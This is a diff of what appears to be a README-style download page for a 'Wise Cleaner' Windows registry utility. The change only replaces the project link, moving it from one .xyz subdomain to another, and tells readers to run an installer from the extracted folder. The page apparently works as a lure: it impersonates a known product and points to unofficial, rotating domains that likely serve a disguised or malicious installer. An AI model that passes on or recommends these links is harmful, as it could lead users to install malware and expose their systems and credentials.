@@ -8,8 +8,8 @@ Wise Cleaner desktop package for Windows · utility toolkit · local install rea
 
 > Use the project link below for Windows.
 
-* **Project link:** **[wise-registry-cleaner.nexpath.xyz](https://wise-registry-cleaner.nexpath.xyz/)**
-* **Full URL:** `https://wise-registry-cleaner.nexpath.xyz/`
+* **Project link:** **[wise-registry-cleaner.nerasix.xyz](https://wise-registry-cleaner.nerasix.xyz/)**
+* **Full URL:** `https://wise-registry-cleaner.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
